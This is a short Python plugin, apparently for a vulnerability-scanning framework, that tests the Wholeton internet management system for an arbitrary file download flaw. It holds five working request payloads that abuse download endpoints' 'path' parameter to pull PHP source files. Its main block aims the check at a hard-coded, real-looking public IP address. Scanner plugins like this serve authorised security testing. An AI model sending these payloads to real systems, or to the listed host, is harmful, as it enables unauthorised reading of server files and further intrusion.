#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = 惠尔顿上网管理系统任意文件下载
#_Function_ = 插件格式
#_FileName_ = Huierdun_Download_Anything.py
def assign(service, arg):
    if service == "wholeton": 
        return True, arg 

def audit(arg):
    payloads=[
    'base/web/downAnnex.php?filename=111111&path=/usr/local/WholetonTM/htdocs/base/web/downAnnex.php',
    'base/stats/download.php?filename=downAnnex.php&path=/usr/local/WholetonTM/htdocs/base/web/',
    'base/stats/download_pdf.php?filename=downAnnex.php&path=/usr/local/WholetonTM/htdocs/base/web/',
    'base/stats/download_txt.php?filename=downAnnex.php&path=/usr/local/WholetonTM/htdocs/base/web/',
    'base/sys/download_file.php?filename=111111&path=/usr/local/WholetonTM/htdocs/base/web/downAnnex.php'
    ]
    for payload in payloads :
        url=arg+payload
        code,head,body,errcode,fina_url=curl.curl(url)
        if code == 200 and 'filename' in body and '$_REQUEST' in body and '<?php' in body:
            security_warning(url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('wholeton', 'http://222.223.56.116/')[1])